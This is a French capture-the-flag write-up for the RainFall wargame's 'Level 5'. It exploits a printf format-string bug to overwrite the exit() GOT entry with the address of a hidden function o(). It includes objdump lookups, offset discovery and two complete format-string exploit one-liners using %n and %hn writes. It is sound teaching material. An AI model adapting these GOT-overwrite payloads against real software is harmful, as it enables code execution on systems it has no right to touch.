# Level 5

Dans ce challenge, nous avons encore un printf non securise, mais pas de variable globale a ecraser.
Par contre, on trouve une fonction o() qui n'est jamais appele.
Pourrions nous ecraser une adresse pour la remplacer par celle-ci?
Le programme fait un appel exit() juste apres notre printf a exploiter et apres quelques recherches, il semblerait que nous puissions ecraser l'addresse de exit() pas celle que nous desirons.

Cherchons d'abord l'addresse de la fonction o() que nous voulons injecter:
```
level5@RainFall:~$ objdump -t ./level5 | grep -w o
080484a4 g     F .text	0000001e              o
```

Cherchons ensuite l'addresse de notre fonction exit cible
```
level5@RainFall:~$ objdump -R ./level5

./level5:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049814 R_386_GLOB_DAT    __gmon_start__
08049848 R_386_COPY        stdin
08049824 R_386_JUMP_SLOT   printf
08049828 R_386_JUMP_SLOT   _exit
0804982c R_386_JUMP_SLOT   fgets
08049830 R_386_JUMP_SLOT   system
08049834 R_386_JUMP_SLOT   __gmon_start__
08049838 R_386_JUMP_SLOT   exit				# Addresse de exit
0804983c R_386_JUMP_SLOT   __libc_start_main
```

"\x38\x98\x04\x08" est une addresse qui tiens `exit` comme valeur.

"0x80484a4 - 4 " est l'addresse de n - 4 pour enlever les 4 octets de l'addresse d'exit

Nous devons maintenant trouver l'offset sur lequel printf override.
```
level5@RainFall:~$ python -c 'print("AAAA" + "%08x." * 8)' | ./level5 | grep 41
AAAA00000200.b7fd1ac0.b7ff37d0.41414141.78383025.3830252e.30252e78.252e7838.

level5@RainFall:~$ echo 'AAAA%4$p' | ./level5
AAAA0x41414141
```

C'est le 4eme octet.

Nous pouvons ainsi proceder a l'injection:
```
$(python -c 'print("\x38\x98\x04\x08"+"%"+str(0x80484a4 - 4)+"d%4$n")'; cat -) | ./level5
```

Solution 2 plus complexe:
```
python -c 'print("\x3A\x98\x04\x08\x38\x98\x04\x08%2044x%4$hn%31904x%5$hn")' > /tmp/test ;cat /tmp/test - | ./level5
```
